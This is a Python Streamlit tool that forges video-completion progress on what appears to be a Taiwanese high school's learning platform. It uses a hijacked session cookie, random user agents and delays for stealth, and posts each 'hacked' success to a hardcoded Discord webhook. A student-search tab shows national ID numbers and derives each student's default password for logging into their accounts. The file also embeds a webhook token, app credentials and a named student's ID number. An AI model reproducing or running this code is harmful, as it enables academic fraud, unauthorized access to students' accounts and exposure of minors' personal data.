import streamlit as st
import requests
import time
import random
from urllib.parse import urlparse, parse_qs
import pandas as pd

@st.cache_data
def load_student_csv():
    try:
        return pd.read_csv("student.csv")  # or use a static path or upload option
    except:
        # Fallback to mocked data
        return pd.DataFrame([{
            "sid": 1,
            "uid": 1130273,
            "sp": None,
            "class": "高一",
            "uname": "毛清偉",
            "classn": 1,
            "index": 2918,
            "upasswd": "E126581765",
            "classroom": "03A"
        }])

students_df = load_student_csv()

# === CONFIG ===
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1402211944743567440/7jRAZdnPJq8MzmHsmIERrShv253fG4toTBskp9BafOv4k9EAu0BHsbNMlxI3kB6PrLpc"
BASE_URL = "https://dmhs.teams.com.tw"
DASHBOARD_URL_TEMPLATE = f"{BASE_URL}/VideoProgress!dashboard?user={{user_id}}&showCompleted=true"
PROGRESS_URL = f"{BASE_URL}/VideoProgress!insertProgress"
DEFAULT_SESSION = "AF1B47245D695296E9CF45A2B7A36162"
DEFAULT_USER_ID = "D10028_STUDENT_003052"
USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)',
]

# === AUTH ===
def login():
    st.title("🔒 Dashboard ")
    with st.form("login"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")
        if submitted:
            if username == "ethan" and password == "ethan0503":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Incorrect credentials")

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    login()
    st.stop()

# === STATE ===
for key in ["users_helped", "videos_progressed"]:
    if key not in st.session_state:
        st.session_state[key] = 0

if "links" not in st.session_state:
    st.session_state.links = []

if "manual_links" not in st.session_state:
    st.session_state.manual_links = ""

if "submitted_links" not in st.session_state:
    st.session_state.submitted_links = set()

# === UTILS ===
def send_discord_webhook(video_url, user_id):
    content = f"🎬 **Video progress hacked**\n🔗 {video_url}\n👤 User: {user_id}"
    data = {"content": content}
    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=data)
        if resp.status_code != 204:
            st.warning(f"⚠️ Discord webhook failed: {resp.status_code}")
    except Exception as e:
        st.warning(f"⚠️ Webhook exception: {e}")

def build_video_url(course, user, unit, task):
    return f"{BASE_URL}/student/cinemaVideo.html?course={course}&user={user}&id={unit}&task={task}"

def get_common_headers(video_url, session_id, user_id):
    return {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': video_url,
        'User-Agent': random.choice(USER_AGENTS),
        'Cookie': f"JSESSIONID={session_id}; userId={user_id};"
    }

def fetch_completed_videos(user_id):
    url = DASHBOARD_URL_TEMPLATE.format(user_id=user_id)
    headers = {"X-Requested-With": "XMLHttpRequest"}
    cookies = {"userId": user_id}

    try:
        r = requests.get(url, headers=headers, cookies=cookies)
        if r.status_code != 200:
            return [], f"❌ Fetch error: {r.status_code}"

        data = r.json().get("result", [])
        if not data:
            return [], "🎉 No completed videos found."

        links = []
        for item in data:
            task = item.get("task", {})
            unit = item.get("unit", {})
            if not unit.get("video"):
                continue
            course_id = task.get("course", "UNKNOWN_COURSE")
            unit_id = unit.get("_id", "UNKNOWN_UNIT")
            task_id = task.get("_id", "UNKNOWN_TASK")
            links.append(build_video_url(course_id, user_id, unit_id, task_id))
        return links, f"✅ Found {len(links)} real video(s)."
    except Exception as e:
        return [], f"❌ Fetch exception: {e}"

def submit_video_progress(video_url, session_id, debug=False, use_webhook=True, min_delay=0.5, max_delay=1.5):
    parsed = urlparse(video_url)
    qs = parse_qs(parsed.query)
    course = qs.get('course', [None])[0]
    user = qs.get('user', [None])[0]
    unit = qs.get('id', [None])[0]
    task = qs.get('task', [None])[0]
    if not all([course, user, unit, task]):
        return f"[ERROR] URL missing: {video_url}"

    headers = get_common_headers(video_url, session_id, user)
    data = {
        'task': task,
        'unit': unit,
        'course': course,
        'user': user,
        'type': 'teams',
        'startScale': '0',
        'endScale': str(random.randint(96, 100)),  # random endScale
    }

    try:
        if video_url in st.session_state.submitted_links:
            return f"🔁 Skipped duplicate: {video_url}"
        if random.random() < 0.05:
            return f"🧍 Intentionally skipped for realism: {video_url}"

        resp = requests.post(PROGRESS_URL, headers=headers, data=data)
        time.sleep(random.uniform(min_delay, max_delay))

        if resp.status_code == 200:
            st.session_state.videos_progressed += 1
            st.session_state.submitted_links.add(video_url)
            if use_webhook:
                send_discord_webhook(video_url, user)
            return f"✅ Submitted: {video_url}"
        return f"❌ Failed ({resp.status_code}): {video_url}"
    except Exception as e:
        return f"⚠️ Exception: {e}"

# === UI ===
st.set_page_config(page_title="Video Submitter Pro", layout="wide")
st.title("🎞️ Video Progress Submitter Pro")

st.markdown("## 🔧 Configuration")
col1, col2 = st.columns(2)
session_id = col1.text_input("JSESSIONID", value=DEFAULT_SESSION)
user_id = col2.text_input("User ID", value=DEFAULT_USER_ID)

st.markdown("## 🧩 Mode Selection")
tab1, tab2, tab3 = st.tabs(["📥 Manual", "🔍 Fetch ", "🎓 Student Search"])

with tab1:
    st.session_state.manual_links = st.text_area("Paste video links (one per line)", value=st.session_state.manual_links, height=200)
    if st.session_state.manual_links.strip():
        st.session_state.links = [line.strip() for line in st.session_state.manual_links.strip().splitlines()]
        st.success(f"✅ Loaded {len(st.session_state.links)} manual link(s).")

with tab2:
    if st.button("🔍 Fetch"):
        with st.spinner("Fetching..."):
            links, msg = fetch_completed_videos(user_id)
            st.info(msg)
            if links:
                st.session_state.links = links
                for i, link in enumerate(links, 1):
                    st.markdown(f"{i}. [`{link}`]({link})")

st.markdown("---")
with st.expander("🛡️ Advanced Stealth Settings", expanded=True):
    use_webhook = st.checkbox("📢 Enable Discord Webhook", value=True)
    debug = st.checkbox("🪛 Enable Debug Logs")
    col3, col4 = st.columns(2)
    min_delay = col3.slider("⏳ Min Delay (sec)", 0.1, 5.0, 0.5, 0.1)
    max_delay = col4.slider("⏳ Max Delay (sec)", 0.5, 10.0, 1.4, 0.1)

if st.session_state.links:
    if st.button("🚀 Submit All"):
        if not session_id or not user_id:
            st.error("❗ Session ID and User ID are required.")
        else:
            with st.spinner("Submitting..."):
                results = []
                for i, link in enumerate(st.session_state.links, 1):
                    msg = submit_video_progress(link, session_id, debug, use_webhook, min_delay, max_delay)
                    results.append(f"{i}. {msg}")
                st.session_state.users_helped += 1
                st.success("✅ Submission Complete")
                st.markdown("### 📋 Results")
                for r in results:
                    st.write(r)

    st.download_button("💾 Download Links", data="\n".join(st.session_state.links), file_name="video_links.txt")
with tab3:
    st.subheader("🎓 學生資料多條件查詢")

    # Mapping of field display name to actual CSV column
    column_mapping = {
        "學號 (UID)": "uid",
        "姓名 (Name)": "uname",
        "身分證 (ID)": "upasswd",
        "班級 (Classroom)": "classroom",
        "年級 (Grade)": "class",
    }

    # UI for up to 3 filters
    st.markdown("### 🔎 查詢條件")
    col1, col2, col3 = st.columns(3)
    field1 = col1.selectbox("條件 1 欄位", list(column_mapping.keys()), key="f1")
    value1 = col1.text_input("條件 1 關鍵字", key="v1")

    field2 = col2.selectbox("條件 2 欄位", list(column_mapping.keys()), key="f2")
    value2 = col2.text_input("條件 2 關鍵字", key="v2")

    field3 = col3.selectbox("條件 3 欄位", list(column_mapping.keys()), key="f3")
    value3 = col3.text_input("條件 3 關鍵字", key="v3")

    # Perform filtering only when there's input
    if any([value1.strip(), value2.strip(), value3.strip()]):
        df_filtered = students_df.copy()

        for field_label, value in [(field1, value1), (field2, value2), (field3, value3)]:
            if value.strip():
                col_name = column_mapping[field_label]
                query = value.strip()

                # Convert numeric grade input like "1" to "高一"
                if col_name == "class":
                    query = {"1": "高一", "2": "高二", "3": "高三"}.get(query, query)

                df_filtered = df_filtered[
                    df_filtered[col_name].astype(str).str.lower().str.contains(query.lower())
                ]

        if df_filtered.empty:
            st.warning("❌ 沒有符合的資料")
        else:
            st.success(f"✅ 找到 {len(df_filtered)} 筆資料")

            for _, row in df_filtered.iterrows():
                uid = str(row["uid"])
                name = str(row["uname"])
                id_card = str(row["upasswd"])
                password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else "❌ 身分證錯誤"

                with st.container():
                    st.markdown(f"**🧑‍🎓 學號**: `{uid}`")
                    st.markdown(f"**📛 姓名**: `{name}`")
                    st.markdown(f"**🪪 身分證**: `{id_card}`")
                    st.markdown(f"**🔐 預設密碼**: `{password}`")

                    colA, colB = st.columns(2)
                    colA.markdown("📋 複製帳號 (學號):")
                    colA.code(uid, language="text")

                    colB.markdown("📋 複製密碼 (dm後4碼):")
                    colB.code(password, language="text")

                    st.markdown("---")
    else:
        st.info("請輸入至少一個查詢條件以開始搜尋")


st.markdown("---")
st.metric("📈 Videos Progressed", st.session_state.videos_progressed)
st.metric("🧑‍🤝‍🧑 Users Helped", st.session_state.users_helped)
